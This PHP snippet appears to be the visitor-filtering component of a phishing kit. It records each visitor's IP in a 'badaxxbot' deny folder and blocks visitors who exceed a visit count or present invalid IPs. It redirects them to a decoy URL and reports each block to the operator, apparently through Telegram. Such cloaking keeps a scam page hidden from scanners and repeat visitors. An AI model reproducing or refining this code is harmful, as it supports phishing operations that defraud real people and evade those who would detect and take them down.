<?php
$clean_ip = filter_var($remoteip, FILTER_SANITIZE_NUMBER_INT);
if (filter_var($remoteip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_RES_RANGE)) {
    if (file_exists('badaxxbot/deny/' . $clean_ip . '.txt')) {
        $lines = count(file('badaxxbot/deny/' . $clean_ip . '.txt'));
        if ($lines >= $visitcount) {
            $info_access = $respo->geoplugin_request . ' from ' . $respo->geoplugin_countryName . ' exhausted visit count and was blocked,  please open config.php and increase $visitcount if your still setting up ';
            if ($full_notification) {
                teleg($info_access);
            }
            header('Location: ' . faker());
            exit();
        }
    }
    file_put_contents('badaxxbot/deny/' . $clean_ip . '.txt', $remoteip . "\n", FILE_APPEND);
} else {
    $info_unknonw = $respo->geoplugin_request . ' from ' . $respo->geoplugin_countryName . ' visiting with fake ip and was blocked ';
    if ($full_notification) {
        teleg($info_unknonw);
    }
    header('Location: ' . faker());
    exit();
} ?>